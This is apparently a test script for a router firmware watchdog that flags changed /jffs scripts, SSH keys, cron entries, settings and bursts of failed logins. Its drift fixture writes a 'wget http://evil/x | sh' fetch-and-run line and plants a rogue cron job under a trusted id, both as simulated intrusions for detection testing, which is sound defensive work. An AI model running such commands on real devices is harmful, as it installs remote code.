#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rwatch section 3h, the security review (2026-10-19): drift of /jffs scripts, configs, SSH
keys, add-on files, cron entries and the WAN-exposure settings against a baseline the
operator accepted on the Firewall page's Status tab.

WHY THIS EXISTS. The watchdog's new block is shell inside one C string (rc/rwatch.c), so
nothing compiles it and nothing runs it before a build. It is also the one place in the
tree that turns untrusted text (a cron line is whatever was typed) into JSON a page
reads, and it must stay ADVISORY: a change is never undone and never becomes a FAILURE
(an incident dump + "outage" accounting), because a watch that alarms on the operator's
own edits trains people to ignore it.

WHAT IT DOES. Lifts the generated shell out of rwatch.c (the C literal of the one fputs(),
macros resolved from rc/reaper_hook.h), cuts the review functions (RV_JFFS= .. the
`review` argv entry) and runs them under /bin/sh - and under busybox ash when the host
has one - against a fixture /jffs tree with fake `cru`, `_nv` and `logger`. Checks:
unarmed (no baseline: a full inventory, nothing logged), accept -> armed and clean, one
drift of every kind (S/K/A/C/N, list-shaped setting hashed) reported with the right
status and logged ONCE across two ticks, a cron line holding a quote and a backslash
still yields valid JSON, re-accept clears, the switch off removes the report. Then pins
in source: the argv entry sits between HEALGRACE and the hung-nvram reaper, the 3h
block runs past HEALGRACE and not inside a rules apply window, never touches FAIL/CRIT,
the CGI gates first and writes the baseline with rjf_set, the ack runs the script
detached through reaper_script_ok, the page carries http_id, the export row and the
default exist.

Exit 0 pass, 1 fail, 77 skipped (no router source tree - pass release/src/router as
argv[1] or REAPER_ROUTER_SRC - or no /bin/sh).
"""
import json, os, re, shutil, subprocess, sys, tempfile

def skip(msg):
    print("SKIP: " + msg); sys.exit(77)

def die(msg):
    print("FAIL: " + msg); sys.exit(1)

passed = 0
def ok(cond, what):
    global passed
    if not cond: die(what)
    passed += 1
    print("ok   " + what)

SRC = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("REAPER_ROUTER_SRC", "")
if not SRC or not os.path.isfile(os.path.join(SRC, "rc", "rwatch.c")):
    skip("no router source tree (argv[1] or REAPER_ROUTER_SRC = .../release/src/router)")
SH = "/bin/sh" if os.path.exists("/bin/sh") else shutil.which("sh")
if not SH:
    skip("no /bin/sh to run the lifted shell")
BB = shutil.which("busybox")
if BB and subprocess.run([BB, "ash", "-c", "true"], capture_output=True).returncode != 0:
    BB = None

def read(rel):
    p = os.path.join(SRC, rel)
    if not os.path.isfile(p):
        die("missing %s" % rel)
    with open(p, encoding="utf-8", errors="replace") as f:
        return f.read()

# ---- the C-literal lifter (the same shape test_front_narrow.py uses; tests stay self-contained)
def macros_of(header):
    m = {}
    for line in header.splitlines():
        mm = re.match(r'\s*#define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.*)$', line)
        if not mm: continue
        name, rest = mm.group(1), mm.group(2)
        parts = re.findall(r'"((?:[^"\\]|\\.)*)"|([A-Za-z_][A-Za-z0-9_]*)', rest)
        if not parts or not any(s for s, _ in parts): continue
        val, okay = "", True
        for s, ident in parts:
            if ident:
                if ident in m: val += m[ident]
                else: okay = False; break
            else:
                val += s
        if okay: m[name] = val
    return m

def c_unescape(s):
    out, i = [], 0
    table = {"n": "\n", "t": "\t", '"': '"', "\\": "\\", "'": "'", "?": "?", "a": "\a", "r": "\r"}
    while i < len(s):
        c = s[i]
        if c == "\\" and i + 1 < len(s):
            nxt = s[i + 1]
            if nxt in "01234567":
                j = i + 1
                while j < len(s) and j < i + 4 and s[j] in "01234567": j += 1
                out.append(chr(int(s[i + 1:j], 8))); i = j
            else:
                out.append(table.get(nxt, "\\" + nxt)); i += 2
        else:
            out.append(c); i += 1
    return "".join(out)

def lifted_script(csrc, needle, macros):
    at = csrc.find(needle)
    if at < 0: die("%r not found in the generator" % needle)
    start = csrc.rfind("fputs(", 0, at)
    end = csrc.find(", f);", at)
    if start < 0 or end < 0: die("could not frame the fputs() around %r" % needle)
    # one pass over strings, block comments and identifiers IN ORDER: a `/*` inside a
    # string literal (a shell glob such as scripts/*) is not a comment, and stripping
    # comments first would eat every literal up to the next `*/` wherever it sits
    body = csrc[start + 6:end]
    text = ""
    for m in re.finditer(r'"((?:[^"\\]|\\.)*)"|(/\*.*?\*/)|([A-Za-z_][A-Za-z0-9_]*)', body, re.S):
        if m.group(1) is not None:
            text += c_unescape(m.group(1))
        elif m.group(3) is not None:
            text += c_unescape(macros.get(m.group(3), ""))
    return text

rw = read("rc/rwatch.c")
macros = macros_of(read("rc/reaper_hook.h"))
script = lifted_script(rw, "RV_JFFS=/jffs", macros)

def between(text, a, b, what):
    i = text.find(a)
    if i < 0: die("%s: %r not found" % (what, a))
    j = text.find(b, i)
    if j < 0: die("%s: %r not found after %r" % (what, b, a))
    return text[i:j + len(b)]

block = between(script, "RV_JFFS=/jffs\n", '[ "$1" = review ] && { _rv_run; exit 0; }\n', "review block")
ok("_rv_inv() {" in block and "_rv_diff() {" in block and "_rv_json() {" in block and "_rv_run() {" in block,
   "the four review functions are emitted before the argv entry")

# ---- 1. syntax under every shell the box could run it with
work = tempfile.mkdtemp(prefix="rvw_")
try:
    bp = os.path.join(work, "block.sh"); open(bp, "w").write(block)
    r = subprocess.run([SH, "-n", bp], capture_output=True, text=True)
    ok(r.returncode == 0, "the review block passes sh -n (%s)" % r.stderr.strip()[:200])
    if BB:
        r = subprocess.run([BB, "ash", "-n", bp], capture_output=True, text=True)
        ok(r.returncode == 0, "the review block passes busybox ash -n (%s)" % r.stderr.strip()[:200])

    # ---- 2. behaviour against a fixture tree
    jffs = os.path.join(work, "jffs"); tmpd = os.path.join(work, "tmp"); nvd = os.path.join(work, "nv")
    binp = os.path.join(work, "bin"); logf = os.path.join(work, "logger.out"); cruf = os.path.join(work, "cru.txt")
    for d in (os.path.join(jffs, "scripts"), os.path.join(jffs, "configs"), os.path.join(jffs, ".ssh"),
              os.path.join(jffs, "addons", "secaudit", "sub dir"), tmpd, nvd, binp):
        os.makedirs(d, exist_ok=True)
    open(os.path.join(jffs, "scripts", "firewall-start"), "w").write("#!/bin/sh\niptables -I INPUT 1 -i tailscale0 -j ACCEPT\n")
    open(os.path.join(jffs, "configs", "dnsmasq.conf.add"), "w").write("log-queries\n")
    open(os.path.join(jffs, ".ssh", "authorized_keys"), "w").write("ssh-ed25519 AAAA test\n")
    open(os.path.join(jffs, ".ssh", "dropbear_ed25519_host_key"), "w").write("PRIVATE KEY BYTES\n")
    open(os.path.join(jffs, "addons", "secaudit", "sub dir", "mod.sh"), "w").write("echo hi\n")
    open(os.path.join(jffs, "addons", "secaudit", "run.sh"), "w").write("exit 0\n")
    os.symlink(os.path.join(jffs, "addons", "secaudit", "run.sh"), os.path.join(jffs, "addons", "secaudit", "link.sh"))
    # cron: two of Reaper's own (dropped), one user line carrying a quote and a backslash
    open(cruf, "w").write('*/5 * * * * sh /tmp/reaper/rwatch.sh #rwatch#\n30 4 * * * sh /tmp/rwarden/update.sh #rwarden#\n'
                          '0 3 * * * /jffs/scripts/backup.sh "nightly" \\\\ #backup#\n')
    nv = {"sshd_enable": "2", "sshd_port": "1845", "vts_enable_x": "0", "vts_rulelist": "", "misc_http_x": "0",
          "rwatch_review": "1", "wan0_dns": "1.1.1.1 9.9.9.9"}
    def setnv(k, v): open(os.path.join(nvd, k), "w").write(v)
    for k, v in nv.items(): setnv(k, v)
    open(os.path.join(binp, "cru"), "w").write('#!/bin/sh\n[ "$1" = l ] && cat "$CRU_FILE"\nexit 0\n')
    open(os.path.join(binp, "logger"), "w").write('#!/bin/sh\nprintf "%s\\n" "$*" >> "$LOGF"\n')
    for b in ("cru", "logger"): os.chmod(os.path.join(binp, b), 0o755)

    # review 2026-10-24 (Q-A-6): the inventory reads its single-line settings through the REAL _nvs (one guarded
    # `nvram show`, lifted from rc/reaper_nv.h) over a fake nvram built from the fixture files; usleep is the host's sleep
    NVS = c_unescape(macros_of(read("rc/reaper_nv.h").replace("\\\n", ""))["REAPER_NVS_HELPER"])
    ok("_nvs() {" in NVS and "nvram show >" in NVS and "REAPER_NVS_HELPER" in rw, "rwatch.sh carries _nvs (reaper_nv.h) and the review's inventory uses it")
    NVRAM_OK = 'nvram() { case "$1" in show) for f in "$NVDIR"/*; do [ -f "$f" ] || continue; printf "%s=" "${f##*/}"; cat "$f"; echo; done;; get) cat "$NVDIR/$2" 2>/dev/null;; esac; }\n'
    def run(shell, extra="", nvram_fn=NVRAM_OK):
        base = os.path.join(jffs, "reaper", "review", "baseline")
        # functions, not only PATH stubs: busybox ash in standalone mode runs its own
        # applets (logger, md5sum, awk ...) ahead of PATH, and a function outranks both
        head = ('_nv() { cat "$NVDIR/$1" 2>/dev/null; }\n' + nvram_fn + 'usleep() { sleep 0.02; }\n'
                'logger() { printf "%s\\n" "$*" >> "$LOGF"; }\n'
                'cru() { [ "$1" = l ] && cat "$CRU_FILE"; return 0; }\n' + NVS)
        tail = ('\nRV_JFFS="%s"\nRV_TMP="%s"\nRV_BASE="%s"\n%s\n_rv_run\n' % (jffs, tmpd, base, extra))
        sp = os.path.join(work, "run.sh"); open(sp, "w").write(head + block + tail)
        env = dict(os.environ, NVDIR=nvd, LOGF=logf, CRU_FILE=cruf, LC_ALL="C", PATH=binp + os.pathsep + os.environ.get("PATH", ""))
        cmd = [shell, sp] if shell != "busybox" else [BB, "ash", sp]
        p = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=work, timeout=60)
        if p.returncode != 0:
            die("review block failed under %s:\n%s" % (shell, p.stderr[-800:]))
        jp = os.path.join(tmpd, "review.json")
        j = None
        if os.path.exists(jp):
            raw = open(jp, encoding="utf-8", errors="strict").read()
            try: j = json.loads(raw)
            except Exception as e: die("review.json is not valid JSON under %s: %s\n%s" % (shell, e, raw[:600]))
        logs = open(logf).read().splitlines() if os.path.exists(logf) else []
        return j, logs

    def accept():
        base = os.path.join(jffs, "reaper", "review", "baseline")
        os.makedirs(os.path.dirname(base), exist_ok=True)
        shutil.copyfile(os.path.join(tmpd, "review.inv"), base)
        for f in ("review.last",):
            try: os.unlink(os.path.join(tmpd, f))
            except FileNotFoundError: pass

    shells = [SH] + (["busybox"] if BB else [])
    for shell in shells:
        tag = "sh" if shell == SH else "ash"
        for f in os.listdir(tmpd): os.unlink(os.path.join(tmpd, f))
        shutil.rmtree(os.path.join(jffs, "reaper"), ignore_errors=True)
        if os.path.exists(logf): os.unlink(logf)
        setnv("sshd_enable", "2"); setnv("vts_rulelist", ""); setnv("rwatch_review", "1")
        sc = os.path.join(jffs, "scripts", "new.sh")
        if os.path.exists(sc): os.unlink(sc)
        open(os.path.join(jffs, "configs", "dnsmasq.conf.add"), "w").write("log-queries\n")
        rm = os.path.join(jffs, "addons", "secaudit", "run.sh")
        if not os.path.exists(rm): open(rm, "w").write("exit 0\n")
        open(cruf, "w").write('*/5 * * * * sh /tmp/reaper/rwatch.sh #rwatch#\n30 4 * * * sh /tmp/rwarden/update.sh #rwarden#\n'
                              '0 3 * * * /jffs/scripts/backup.sh "nightly" \\\\ #backup#\n')

        # unarmed
        j, logs = run(shell)
        ok(j and j["ok"] == 1 and j["armed"] == 0 and j["unreviewed"] == 0,
           "[%s] unarmed: a report with armed=0 and nothing unreviewed (got %s)" % (tag, {k: j.get(k) for k in ("ok", "armed", "unreviewed", "total")} if j else j))
        keys = {it["t"] + " " + it["k"]: it for it in j["items"]}
        ok(all(it["st"] == "new" for it in j["items"]) and j["total"] == len(j["items"]), "[%s] unarmed: every item is 'new' and total matches" % tag)
        ok(("S " + os.path.join(jffs, "scripts", "firewall-start")) in keys and ("S " + os.path.join(jffs, "configs", "dnsmasq.conf.add")) in keys
           and ("S " + os.path.join(jffs, ".ssh", "authorized_keys")) in keys, "[%s] inventory hashes scripts, configs and authorized_keys" % tag)
        hk = keys.get("K " + os.path.join(jffs, ".ssh", "dropbear_ed25519_host_key"))
        ok(hk is not None and "PRIVATE" not in hk["v"] and not re.search(r"\b[0-9a-f]{32}\b", hk["v"]), "[%s] a host key is listed by size/date/mode, never hashed" % tag)
        ok(("A " + os.path.join(jffs, "addons", "secaudit", "sub dir") + "/mod.sh") in keys and ("A " + os.path.join(jffs, "addons", "secaudit") + "/run.sh") in keys
           and not any(k.endswith("/link.sh") for k in keys), "[%s] add-on files (a name with a space too) by size/date; a symlink is not a file" % tag)
        cr = [k for k in keys if k.startswith("C ")]
        ok(len(cr) == 1 and "#backup#" in cr[0] and '"nightly"' in cr[0] and "\\" in cr[0], "[%s] only the user's cron line is inventoried, quote and backslash intact in the JSON" % tag)
        ok(keys["N sshd_enable"]["v"] == "2" and keys["N wan0_dns"]["v"] == "1.1.1.1 9.9.9.9", "[%s] scalar settings carry their value" % tag)
        ok(keys["N vts_rulelist"]["v"] == "" and not os.path.exists(os.path.join(tmpd, "review.last")), "[%s] an empty list-shaped setting is empty; unarmed logs nothing" % tag)
        ok(logs == [], "[%s] unarmed: no syslog line" % tag)

        # accept -> armed, clean
        accept()
        j, logs = run(shell)
        ok(j["armed"] == 1 and j["unreviewed"] == 0 and all(it["st"] == "baseline" for it in j["items"]) and logs == [],
           "[%s] accepted: armed, nothing unreviewed, nothing logged" % tag)

        # 2026-10-24 (owner): a setting this firmware watches that the accepted baseline predates (a baseline taken on an
        # older firmware) is adopted into it as it stands and logged once - never a change, so an upgrade does not alarm
        base = os.path.join(jffs, "reaper", "review", "baseline")
        bl = [l for l in open(base).read().splitlines() if not l.startswith("N\trwarden_dns\t") and not l.startswith("N\tgk_enable\t")]
        open(base, "w").write("\n".join(bl) + "\n")
        j, logs = run(shell)
        bt = open(base).read()
        ok(j["armed"] == 1 and j["unreviewed"] == 0 and len(logs) == 1 and "now watching 2 setting(s)" in logs[0] and "rwarden_dns" in logs[0] and "gk_enable" in logs[0]
           and "N\trwarden_dns\t" in bt and "N\tgk_enable\t" in bt and not any(it["st"] == "added" for it in j["items"]),
           "[%s] a setting the baseline predates is adopted into the baseline and logged once, not reported as a change (got %s / %s)" % (tag, j["unreviewed"], logs))
        j, logs = run(shell)
        ok(j["unreviewed"] == 0 and len(logs) == 1, "[%s] ...and the next tick is quiet (the baseline carries it now)" % tag)
        os.unlink(logf)
        # 2026-10-25 (_r39 metal: "removed shroud_enable" after the rename): a setting row the baseline has and this firmware
        # no longer watches is retired from the baseline with one log line - never listed as a change; a removed FILE stays one
        open(base, "a").write("N\tshroud_enable\t1\n")
        j, logs = run(shell)
        bt = open(base).read()
        ok(j["armed"] == 1 and j["unreviewed"] == 0 and len(logs) == 1 and "no longer watched by this firmware" in logs[0]
           and "shroud_enable" in logs[0] and "shroud_enable" not in bt and not any(it["st"] == "removed" for it in j["items"]),
           "[%s] a setting this firmware no longer watches is retired from the baseline and logged once, not a change (got %s / %s)" % (tag, j["unreviewed"], logs))
        j, logs = run(shell)
        ok(j["unreviewed"] == 0 and len(logs) == 1, "[%s] ...and the next tick is quiet" % tag)
        os.unlink(logf)

        # drift of every kind
        open(sc, "w").write("#!/bin/sh\nwget http://evil/x | sh\n")                      # S added
        open(os.path.join(jffs, "configs", "dnsmasq.conf.add"), "w").write("log-queries\nserver=1.2.3.4\n")  # S changed
        os.unlink(rm)                                                                    # A removed
        open(cruf, "a").write("*/1 * * * * /jffs/addons/x/beacon.sh #x#\n")              # C added
        setnv("sshd_enable", "1")                                                        # N changed (scalar)
        setnv("vts_rulelist", "<ssh>22>192.168.50.5>22>TCP")                              # N changed (hashed)
        j, logs = run(shell)
        st = {it["t"] + " " + it["k"]: it["st"] for it in j["items"]}
        ok(j["armed"] == 1 and j["unreviewed"] == 6, "[%s] six changes are unreviewed (got %s)" % (tag, j["unreviewed"]))
        ok(st.get("S " + sc) == "added" and st.get("S " + os.path.join(jffs, "configs", "dnsmasq.conf.add")) == "changed"
           and st.get("A " + os.path.join(jffs, "addons", "secaudit") + "/run.sh") == "removed"
           and any(k.startswith("C ") and "beacon" in k and v == "added" for k, v in st.items())
           and st.get("N sshd_enable") == "changed" and st.get("N vts_rulelist") == "changed",
           "[%s] added / changed / removed statuses per kind" % tag)
        vv = {it["k"]: it["v"] for it in j["items"] if it["t"] == "N"}
        ok(re.fullmatch(r"[0-9a-f]{32}", vv["vts_rulelist"]) is not None and "192.168" not in vv["vts_rulelist"], "[%s] a list-shaped setting is reported as a hash, never its text" % tag)
        ok([it["st"] for it in j["items"][:6]] and all(it["st"] != "baseline" for it in j["items"][:6]), "[%s] changes come first in the item list" % tag)
        ok(len(logs) == 1 and "security review: 6 change(s)" in logs[0] and "no failure is declared" in logs[0], "[%s] one syslog line names the count (%s)" % (tag, logs[:1]))
        j, logs = run(shell)
        ok(len(logs) == 1 and j["unreviewed"] == 6, "[%s] the same change set on the next tick logs nothing more" % tag)
        setnv("misc_http_x", "1")
        j, logs = run(shell)
        ok(len(logs) == 2 and "7 change(s)" in logs[1], "[%s] a further change logs once more" % tag)
        setnv("misc_http_x", "0")
        run(shell)                    # the inventory Accept copies must reflect the current state

        # re-accept clears; switch off removes the report
        accept()
        j, logs = run(shell)
        ok(j["armed"] == 1 and j["unreviewed"] == 0 and not os.path.exists(os.path.join(tmpd, "review.last")), "[%s] re-accept: clean, the log marker is gone" % tag)

        # review 2026-10-24 (S-A-8): a Reaper cron id is skipped only with the command rc installs under it - a line hidden
        # under such an id is a change like any other
        open(cruf, "a").write("15 5 * * * sh /usr/sbin/wallguard.sh update #wallguard#\n*/15 * * * * service start_wallguard_policy >/dev/null 2>&1 #wallguard_e2130#\n"
                              "*/1 * * * * /jffs/addons/x/evil.sh #wallguard_e2359#\n")
        j, logs = run(shell)
        ok(j["unreviewed"] == 1 and any(it["t"] == "C" and "evil" in it["k"] and it["st"] == "added" for it in j["items"])
           and not any(it["t"] == "C" and ("wallguard.sh update" in it["k"] or "start_wallguard_policy" in it["k"]) for it in j["items"]),
           "[%s] a line hidden under a Reaper cron id is reported; the genuine Reaper jobs stay skipped (got %s)" % (tag, j["unreviewed"]))
        kept = [l for l in open(cruf).read().splitlines() if "wallguard" not in l]   # read first: open(..., "w") truncates
        open(cruf, "w").write("".join(l + "\n" for l in kept))
        j, logs = run(shell)
        ok(j["unreviewed"] == 0, "[%s] ...and the review is clean again once that line is gone" % tag)
        setnv("rwatch_review", "0")
        j, logs = run(shell)
        ok(j is None and not os.path.exists(os.path.join(tmpd, "review.inv")), "[%s] switch off: the report and the inventory are removed" % tag)

        # ---- rules (2026-10-20, reviewer: expected /jffs churn flagged every run): per-path modes,
        # exclusions, first match wins, a mode change is not a change, ignored paths never "removed"
        for f in os.listdir(tmpd): os.unlink(os.path.join(tmpd, f))
        shutil.rmtree(os.path.join(jffs, "reaper"), ignore_errors=True)
        if os.path.exists(logf): os.unlink(logf)
        setnv("rwatch_review", "1")
        rules = os.path.join(work, "rules")
        if os.path.exists(rules): os.unlink(rules)
        if not os.path.exists(rm): open(rm, "w").write("exit 0\n")   # the drift section above removed it
        RX = "RV_RULES=%s" % rules
        run(shell, RX); accept()                                   # baseline under the defaults
        j, logs = run(shell, RX)
        ok(j["armed"] == 1 and j["unreviewed"] == 0 and logs == [], "[%s] rules: no rules file = the defaults, clean against their own baseline" % tag)
        open(rules, "w").write("# comment line\n\n"
                               "hash /jffs/addons/secaudit/run.sh\n"          # first match wins over the next line
                               "exist /jffs/addons/*\n"
                               "ignore /jffs/addons/secaudit/sub dir/*\n"     # never reached: exist above matches first
                               "exist /jffs/scripts/firewall-start\n"
                               "hash /jffs/.ssh/dropbear_ed25519_host_key\n"  # a private key: downgraded to meta
                               "ignore cron:*#backup#\n"
                               "ignore nvram:sshd_port\n"
                               "bogus /jffs/scripts/*\n"                      # unknown mode: skipped
                               "ignore\n")                                    # no pattern: skipped
        j, logs = run(shell, RX)
        it = {it["k"]: it for it in j["items"]}
        fs = os.path.join(jffs, "scripts", "firewall-start")
        ra = os.path.join(jffs, "addons", "secaudit") + "/run.sh"
        md = os.path.join(jffs, "addons", "secaudit", "sub dir") + "/mod.sh"
        hk = os.path.join(jffs, ".ssh", "dropbear_ed25519_host_key")
        ok(it.get(fs, {}).get("t") == "E" and it[fs]["v"] == "-" and it[fs]["st"] == "rule",
           "[%s] rules: 'exist' lists a file by existence only, and the switch from hash is status rule (%s)" % (tag, it.get(fs)))
        ok(it.get(ra, {}).get("t") == "S" and it[ra]["st"] == "rule", "[%s] rules: first match wins (hash run.sh ahead of exist addons/*)" % tag)
        ok(it.get(md, {}).get("t") == "E", "[%s] rules: a later ignore never overrides an earlier match" % tag)
        ok(it.get(hk, {}).get("t") == "K" and not re.search(r"\b[0-9a-f]{32}\b", it[hk]["v"]), "[%s] rules: a hash rule on a private key is downgraded - keys are never hashed" % tag)
        ok(not any(k.startswith("0 3 * * *") for k in it) and "sshd_port" not in it,
           "[%s] rules: cron:<glob> and nvram:<key> ignore drop those items - and they are not reported removed" % tag)
        ok(j["unreviewed"] == 0 and logs == [], "[%s] rules: mode changes are not changes - nothing unreviewed, nothing logged (got %d, %s)" % (tag, j["unreviewed"], logs))
        accept()
        open(fs, "a").write("# edited\n")                             # content change under 'exist'
        os.utime(os.path.join(jffs, "addons", "secaudit", "sub dir", "mod.sh"), (1, 1))   # size/date change under 'exist'
        j, logs = run(shell, RX)
        ok(j["unreviewed"] == 0 and logs == [], "[%s] rules: under 'exist' a content or date change is not reported" % tag)
        os.unlink(md)
        j, logs = run(shell, RX)
        ok(j["unreviewed"] == 1 and [x["st"] for x in j["items"] if x["k"] == md] == ["removed"] and len(logs) == 1,
           "[%s] rules: under 'exist' a deletion IS reported (and logged once)" % tag)
        open(md, "w").write("echo hi\n")
        open(rules, "a").write("ignore /jffs/addons/secaudit/link.sh\n")
        prev = open(rules).read()
        open(rules, "w").write("ignore /jffs/addons/*\n" + prev)
        os.unlink(ra)
        j, logs = run(shell, RX)
        ok(not any(x["k"] in (ra, md) for x in j["items"]) and j["unreviewed"] == 0,
           "[%s] rules: an ignored path is neither listed nor reported removed, even when the baseline has it and it is gone" % tag)
        open(ra, "w").write("exit 0\n")
        os.unlink(rules)

        # ---- login watch (Rung 3, 2026-10-19): failed logins per source from the syslog cursor
        for f in os.listdir(tmpd): os.unlink(os.path.join(tmpd, f))
        shutil.rmtree(os.path.join(jffs, "reaper"), ignore_errors=True)
        if os.path.exists(logf): os.unlink(logf)
        setnv("rwatch_review", "1")
        slog = os.path.join(work, "syslog.log")
        def dline(n, ip, port=5000, user="admin"):
            return "Oct 19 09:40:%02d dropbear[%d]: Bad password attempt for '%s' from %s:%d\n" % (n % 60, 100 + n, user, ip, port + n)
        body = "Oct 19 09:40:00 rmcpd-lab: exec: grep Bad password attempt for x from 9.9.9.9:1 /tmp/syslog.log | wc -l\n"
        body += "".join(dline(n, "1.2.3.4") for n in range(12))
        body += "Oct 19 09:40:12 dropbear[200]: Login attempt for nonexistent user from 1.2.3.4:5999\n"
        body += "".join(dline(n, "5.6.7.8") for n in range(3))
        body += "".join("Oct 19 09:40:%02d dropbear[%d]: Bad password attempt for 'root' from [2001:db8::1]:%d\n" % (n, 300 + n, 2200 + n) for n in range(10))
        body += "".join("Oct 19 09:40:%02d HTTPD: [LOGIN][https][Web] failed (192.168.50.9)\n" % n for n in range(11))
        body += "".join("Oct 19 09:40:%02d HTTPD: [LOGIN][http][Web] failed (192.168.50.3)\n" % n for n in range(2))
        open(slog, "w").write(body)
        j, logs = run(shell, extra="RV_LOG=%s" % slog)
        ns = {(n["svc"], n["ip"]): n["n"] for n in (j or {}).get("notices", [])}
        ok(j and j["notices_n"] == 3 and ns == {("ssh", "1.2.3.4"): 13, ("ssh", "2001:db8::1"): 10, ("web", "192.168.50.9"): 11},
           "[%s] login watch: bursts per source (ssh v4 incl. the nonexistent-user line, ssh v6 with the port stripped, web); under the threshold not listed; the lab echo ignored (got %s)" % (tag, ns))
        ok(len(logs) == 3 and all("security review:" in l and "failed" in l and "logins from" in l for l in logs), "[%s] login watch: one syslog line per source (%s)" % (tag, logs[:1]))
        ok(all(n["ts"] > 0 for n in j["notices"]), "[%s] login watch: every notice carries its time" % tag)
        j, logs = run(shell, extra="RV_LOG=%s" % slog)
        ok(j["notices_n"] == 3 and len(logs) == 3, "[%s] login watch: nothing new in the log = nothing added, nothing logged" % tag)
        open(slog, "a").write("".join(dline(n, "1.2.3.4", 6000) for n in range(10)))
        j, logs = run(shell, extra="RV_LOG=%s" % slog)
        ok(j["notices_n"] == 3 and len(logs) == 3, "[%s] login watch: the same source again within the hour is not re-reported" % tag)
        # rotation: the file shrinks; the tail of the rotated copy is read first, then the new file
        old = open(slog).read()
        open(slog + "-1", "w").write(old + "".join(dline(n, "192.0.2.77", 7000) for n in range(10)))
        open(slog, "w").write("".join(dline(n, "198.51.100.88", 8000) for n in range(10)))
        j, logs = run(shell, extra="RV_LOG=%s" % slog)
        ns = {(n["svc"], n["ip"]) for n in j["notices"]}
        ok(j["notices_n"] == 5 and ("ssh", "192.0.2.77") in ns and ("ssh", "198.51.100.88") in ns and len(logs) == 5,
           "[%s] login watch: a rotated log loses nothing - the old file's tail and the new file both count (got %s)" % (tag, sorted(ns)))
        ok(os.path.exists(os.path.join(tmpd, "review.auth")) and len(open(os.path.join(tmpd, "review.auth")).read().splitlines()) == 5, "[%s] login watch: the notices file holds the five" % tag)
finally:
    shutil.rmtree(work, ignore_errors=True)
ok('"RV_AUTH_N=10\\n"' in rw and "_rv_auth() {" in rw and "grep -v 'rmcpd-lab' $_win" in rw and "tail -n 50 $RV_TMP/review.auth" in rw,
   "rwatch.c: the login watch has its threshold, ignores the lab daemon's echo and caps the notices file")
ok('\\\\\\"notices_n\\\\\\":%d,\\\\\\"ww\\\\\\":%d,\\\\\\"ww_p\\\\\\":\\\\\\"%s\\\\\\"}' in rw,
   "rwatch.c: the report carries notices_n for the dashboard bar, then the /jffs write-for-everyone count and first path (2026-10-20)")

# ---- 3. pins in source
i_heal = rw.index('"HEALGRACE=300\\n"'); i_entry = rw.index('"[ \\"$1\\" = review ] && { _rv_run; exit 0; }\\n"')
i_reap = rw.index('"for _p in $(pidof nvram 2>/dev/null); do\\n"'); i_grace = rw.index('"[ \\"$UP\\" -lt 300 ] && exit 0\\n"')
ok(i_heal < i_entry < i_reap < i_grace, "rwatch.c: the `review` argv entry sits after HEALGRACE and before the hung-nvram reaper, the PBR heals and the boot-grace exit")
i_3g = rw.index("# 3g) firewall witnesses"); i_3h = rw.index("# 3h) security review"); i_4 = rw.index("# 4) GDX host-TCP pool")
ok(i_3g < i_3h < i_4, "rwatch.c: 3h runs after 3g and before 4")
blk3h = rw[i_3h:i_4]
ok('[ \\"$UP\\" -ge \\"$HEALGRACE\\" ] && [ ! -f /tmp/reaper_fw/armed ]' in blk3h, "rwatch.c: 3h is held until HEALGRACE and skipped inside a rules apply window")
rvsrc = rw[rw.index('"RV_JFFS=/jffs\\n"'):i_entry] + blk3h
ok("FAIL=" not in rvsrc and "CRIT=" not in rvsrc and "reaper_lockrun" not in rvsrc, "rwatch.c: the review never sets FAIL/CRIT and never heals")
ok("/tmp/reaper/review" in rvsrc or "$RV_TMP/review" in rvsrc, "rwatch.c: the review's files live under /tmp/reaper")

web = read("httpd/web.c")
cgi = between(web, "do_reaper_watch_cgi(char *url, FILE *stream)", "\n}\n", "do_reaper_watch_cgi")
ok(cgi.index("reaper_gate()") < cgi.index('strcmp(action, "status")'), "web.c: the CGI gates before any action")
ok('reaper_gate_deny(stream, why, "RWCH")' in cgi, "web.c: the gate denial carries the handler's own tag")
ok('rjf_set(RVIEW_BASE, body, "review")' in cgi and "O_RDONLY | O_NOFOLLOW" in cgi and "RVIEW_INV_MAX" in cgi, "web.c: ack writes the baseline with rjf_set from a bounded O_NOFOLLOW read")
kick = between(web, "static void rview_kick(void)", "\n}\n", "rview_kick")
ok("reaper_script_ok(RVIEW_SH)" in kick and kick.count("fork()") == 2 and "setsid()" in kick and "_eval(argv, NULL, 30, NULL)" in kick,
   "web.c: the re-check runs detached (double fork) and only when the script passes reaper_script_ok")
ok('{ "reaper_watch.cgi*", "application/json", no_cache_IE7, do_html_post_and_get, do_reaper_watch_cgi, do_auth }' in web, "web.c: the mime row carries do_auth")
ok('{ "watch",  "rwatch_review",   2    }' in web, "web.c: the settings export carries rwatch_review (max 2 for a 0/1 flag)")
ok('nvram_set("rwatch_review", on ? "1" : "0");' in cgi and 'reaper_audit("review"' in cgi, "web.c: the switch is audited")

defaults = read("shared/defaults.c")
ok('{ "rwatch_review", "0", CKN_STR1' in defaults, "defaults.c: rwatch_review defaults off")

page = read("www/Reaper_Firewall.asp")
for needle, what in (
    ("function rvcgi(q,cb){xhr('/reaper_watch.cgi?'+q+'&http_id='+encodeURIComponent(REAPER_HTTPID)", "page: the GET caller carries http_id"),
    ("x.open('POST','/reaper_watch.cgi?http_id='+encodeURIComponent(REAPER_HTTPID)", "page: the POST caller carries http_id"),
    ("td.textContent=v;", "page: rows are rendered with textContent, never innerHTML"),
    ("items=items.filter(function(it){return it.st!=='baseline';});", "page: an armed card lists only the changes"),
    ("reaperConfirm(`<#RFW_353#>`", "page: Accept asks first"),
    ("if(t==='status'){loadStatus();rvLoad();rvLoadRules();rvLoadLog();startAuto();}", "page: entering the Status tab loads the review, its watch rules and the acceptance log"),
    ('<span class="tg" id="rv_tg"', "page: the switch is on the card"),
):
    ok(needle in page, what)
ok("innerHTML" not in between(page, "function rvRender(j){", "\n}\n", "rvRender"), "page: rvRender never assigns innerHTML")

dash = read("www/Main_ReaperDash.asp")
ok("/reaper_watch.cgi?action=status&http_id='+encodeURIComponent(hid)" in dash and "(j&&j.ok&&j.armed)?(j.unreviewed||0):0" in dash
   and "(j&&j.ok)?(j.notices_n||0):0" in dash and 'href="/reaper_shell.asp#Reaper_Firewall.asp?t=status"' in dash,
   "dashboard: the amber bar reads the cached report with http_id, lights on drift (armed) or a login burst, and points at the Status tab")
